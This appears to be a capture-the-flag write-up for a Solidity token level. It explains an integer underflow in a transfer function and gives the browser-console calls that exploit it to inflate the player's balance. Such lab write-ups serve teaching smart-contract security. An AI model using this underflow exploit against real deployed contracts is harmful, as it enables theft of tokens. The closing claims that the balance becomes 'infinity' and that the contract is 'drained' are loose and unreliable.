# **Level 05 — Token**

## 🎯 Goal  
The player starts with 20 tokens. The goal is to find a way to increase your token balance — ideally, to the maximum possible amount — by exploiting a flaw in the contract.

## 💥 Vulnerability  
The contract uses uint256 subtraction without `underflow protection`.
**In versions of Solidity < 0.8.0**, subtraction like balances[msg.sender] -= _value does not throw an error when msg.sender has insufficient tokens — it silently underflows, setting a huge balance.

The part of the vulnerable code:
```solidity 
// Solidity code 
function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check the player's balance - 20 tokens
(await contract.balanceOf(player)).toString()

// 1. Check the total supply of tokens - 21000000
(await contract.totalSupply()).toString()

// 2. Call transfer — trigger underflow via dummy address
await contract.transfer("0x1000000000000000000000000000000000000001", 21)

// 3. Check the player's new balance - 115792089237316195423570985008687907853269984665640564039457584007913129639872
// (infinity)
(await contract.balanceOf(player)).toString()
```

## 🧙 Outcome
The player’s balance underflowed and became very large, effectively draining the contract.
